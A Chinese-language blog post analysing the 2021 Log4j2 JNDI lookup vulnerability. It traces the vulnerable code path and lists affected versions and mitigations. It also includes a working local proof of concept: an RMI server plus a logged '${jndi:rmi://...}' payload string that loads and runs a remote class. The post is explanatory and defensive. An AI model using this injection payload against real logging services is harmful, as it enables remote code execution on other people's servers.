+++
title="深入分析Log4j 漏洞"
date="2021-12-27 22:22:10"
tags=["日志","Log4j"]
+++
几乎每个系统都会使用日志框架，用于记录日志信息，这些信息可以提供程序运行的上下文，但是日志过多也会影响系统的性能，所以好的日志框架应该是可靠，快速和可扩展的。

Apache Log4j2 是一个基于 Java 的日志工具，是Log4j的升级版本，引入了很多丰富的特性，包括高性能，低垃圾收集，插件系统等。目前很多互联网公司以及耳熟能详的公司的系统或者开源框架都在使用Log4j2。

<!-- more --> 

2021.12.7，Log4j首次被发现了一个非常严重的漏洞，在当天Log4j就发布了`log4j-2.15.0-rc1`，但是12.9那天被发现这个版本仍然可以触发漏洞。简单点说，**黑客可以恶意构造特殊数据请求包payload触发漏洞，从而可以在目标服务器上执行任意代码，导致服务器被黑客控制**，被定性为“过去十年来最大、最关键的漏洞”。

**根据目前统计，90%以上基于java开发的应用平台都会受到影响**。那么这篇文章就会深入分析这个漏洞究竟是怎么产生的以及怎么修复它。

## 1. Log4j简介
Apache Log4j 是一个基于[Java](https://zh.wikipedia.org/wiki/Java)的日志记录工具。它是由Ceki Gülcü首创的，现在已经发展为[Apache软件基金会](https://zh.wikipedia.org/wiki/Apache软件基金会)的项目之一。 

 经过多年的开发迭代，Log4j 1.x的维护已经变得非常困难，因为它需要与非常旧的 Java 版本兼容，所以于 2015 年 8 月正式升级为Log4j2。

## 2. Log4j的lookup功能

本次漏洞是因为Log4j2组件中 lookup功能的实现类 `JndiLookup` 的设计缺陷导致，这个类存在于`log4j-core-xxx.jar`中。

![lo77lI](https://image.ldbmcs.com/lo77lI.jpg)

log4j的[Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)功能可以快速打印包括运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。比如我们打印Java运行时版本：

```java
public class VulnerabilityTest {
    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {
        LOGGER.error("Test:{}","${java:runtime}");
    }
}
```

输出：

```java
20:20:21.312 [main] ERROR com.ldbmcs.VulnerabilityTest - OpenJDK Runtime Environment (build 11.0.11+9) from AdoptOpenJDK
```

**那么`JndiLookup`到底有什么设计缺陷导致出现的史诗级漏洞呢？**

我们首先把目标放在`org.apache.logging.log4j.core.pattern.MessagePatternConverter#format`:

```java
public void format(final LogEvent event, final StringBuilder toAppendTo) {
        Message msg = event.getMessage();
        if (msg instanceof StringBuilderFormattable) {
            boolean doRender = this.textRenderer != null;
            StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo;
            int offset = workingBuilder.length();
            if (msg instanceof MultiFormatStringBuilderFormattable) {
                ((MultiFormatStringBuilderFormattable)msg).formatTo(this.formats, workingBuilder);
            } else {
                ((StringBuilderFormattable)msg).formatTo(workingBuilder);
            }

            if (this.config != null && !this.noLookups) {
                for(int i = offset; i < workingBuilder.length() - 1; ++i) {
                    if (workingBuilder.charAt(i) == '$' && workingBuilder.charAt(i + 1) == '{') {
                        String value = workingBuilder.substring(offset, workingBuilder.length());
                        workingBuilder.setLength(offset);
                        workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));
                    }
                }
            }
						 ...
        } else {
						...
        }
    }
```

我们传入的message会通过`MessagePatternConverter.format()`，判断如果`config`存在并且`noLookups`为false（默认为false），然后匹配到`${`则通过`getStrSubstitutor()`替换原有的字符串，比如这里的`${java:runtime}`。

因为这里没有任何的白名单，那么我们就可以构造任何的字符串，只有符合`${`就可以。

继续往下走，来到`org.apache.logging.log4j.core.lookup.Interpolator#lookup`

![dy4svJ](https://image.ldbmcs.com/dy4svJ.png)

我们可以看到处理event的时候根据前缀选择对应的`StrLookup`进行处理，目前支持date，jndi，java，main等多种类型，如果构造的event是jndi，则通过`JndiLoopup`进行处理，从而构造漏洞。

## 3. Log4j 漏洞

受影响的版本：

2.0-beta9 <= Apache Log4j <= 2.15.0-rc1

> **Log4j 1.x**不受此漏洞影响。

受影响的框架或者组件：

- Spring-boot-strater-log4j2
- Apache Solr
- Apache Flink
- Apache Druid

## 4. Log4j 漏洞复现

我们以[RMI](https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/hello/hello-world.html)服务为例复现Log4j的漏洞，RMI是远程方法调用(Remote Method Invocation)，能够让A电脑的java虚拟机上的对象调用B电脑的java 虚拟机中的对象上的方法。但是客户端并不是直接调用服务器上的方法的，而是会借助**存根 (stub)** 充当我们客户端的代理，来访问服务端，同时**骨架 (Skeleton)** 是另一个代理，它与真实对象一起在服务端上，骨架将接受到的请求交给服务器来处理，服务器处理完成之后将结果进行打包发送至存根 ，然后存根将结果进行解包之后的结果发送给客户端。

RMI包括三个部分：

- Registry：提供服务注册与服务获取。即Server端向Registry注册服务，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。
- Server： 远程方法的提供者，并向Registry注册自身提供的服务。
- Client:：远程方法的消费者，从Registry获取远程方法的相关信息并且调用。

![OKveDJ](https://image.ldbmcs.com/OKveDJ.jpg)

创建`Server`类：

```java
public class RMIServer {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(new Reference("com.ldbmcs.rmi.RmiExecute", "com.ldbmcs.rmi.RmiExecute", null));
            registry.bind("Hello", referenceWrapper);
        } catch (Exception e) {
            System.out.println("Server Exception: " + e);
            e.printStackTrace();
        }
    }
}
```

创建对象：

```java
public class RmiExecute {
    static {
        System.out.println("Hello, World");
    }
}
```

接着，我们在测试类`VulnerabilityTest`中修改代码如下：

```java
public class VulnerabilityTest {
    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {
        String test = "${jndi:rmi://localhost:1099/Hello}";
        LOGGER.error("Test:{}", test);
    }
}
```

分别启动`RMIServer`和`VulnerabilityTest`，我们可以看到在`VulnerabilityTest`中打印出：

```java
Hello, World
```

也就是说，我们可以在目标服务器中执行任意代码，影响不言而喻。

那么怎么解决呢？

## 5. Log4j 漏洞修复

1. 设置jvm参数：`-Dlog4j2.formatMsgNoLookups=true`
2. 设置系统环境变量：`FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true`
3. 升级版本：[官方](https://logging.apache.org/log4j/2.x/download.html)，最新的版本仅支持java, ldap, 和 ldaps，同时默认禁用JNDI等等功能去限制利用构造payload去触发漏洞。
   - Java 8及之后的版本升级到 v2.16.0。
   - Java 7 升级到 v2.12.2。
   - 其他版本，删除`JndiLookup`类：`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`